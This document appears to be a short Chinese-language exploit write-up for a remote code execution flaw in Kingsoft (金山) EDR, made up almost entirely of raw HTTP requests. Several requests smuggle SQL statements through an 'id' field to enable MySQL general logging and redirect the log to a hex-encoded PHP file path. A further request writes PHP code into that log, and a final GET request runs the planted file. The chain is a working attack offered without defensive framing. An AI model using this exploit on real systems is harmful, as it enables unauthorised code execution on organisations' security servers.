## 金山EDR RCE漏洞
```
开启⽇志 /Console/inter/handler/change_white_list_cmd.php id参数
POST /inter/ajax.php?cmd=get_user_login_cmd HTTP/1.1
Host: 192.168.24.3:6868
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101
Firefox/114.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 131
Origin: http://192.168.24.3:6868
Connection: close
Referer: http://192.168.24.3:6868/settings/system/user.php?m1=7&m2=0

{"change_white_list_cmd":{"ip":"{BD435CCE-3F91EC}","name":"3AF264D9-
AE5A","id":"111;set//global//general_log=on;","type":"0"}}

设置日志php文件
POST /inter/ajax.php?cmd=get_user_login_cmd HTTP/1.1
Host: 192.168.24.3:6868
Content-Length: 195
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML,
like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.24.3:6868
Referer: http://192.168.24.3:6868/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: SKYLARa0aedxe9e785feabxae789c6e03d=tf2xbucirlmkuqsxpg4bqaq0snb7
Connection: close

{"change_white_list_cmd":{"ip":"{BD435CCE-3F91EC}","name":"3AF264D9-
AE5A","id":"111;set//global//general_log_file=0x2e2e2f2e2e2f436f6e736f6c652f6368656
36b5f6c6f67696e322e706870;","type":"0"}}
写入php代码
POST /inter/ajax.php?cmd=settings_distribute_cmd HTTP/1.1
Host: 192.168.24.3:6868
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101
Firefox/114.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 222
Origin: http://192.168.24.3:6868
Connection: close
Referer: http://192.168.24.3:6868/index.php
{"settings_distribute_cmd":{"userSession":"{BD435CCE-3F91-E1AA-3844-
76A49EE862EB}","mode_id":"3AF264D9-AE5A-86F0-6882-DD7F56827017","settings":"3AF264D9-
AE5A-86F0-6882-DD7F56827017_0","SC_list":{"a":"<?php phpinfo();?>"}}}

最后get请求rce：
http://192.168.24.3:6868/check_login2.php
```
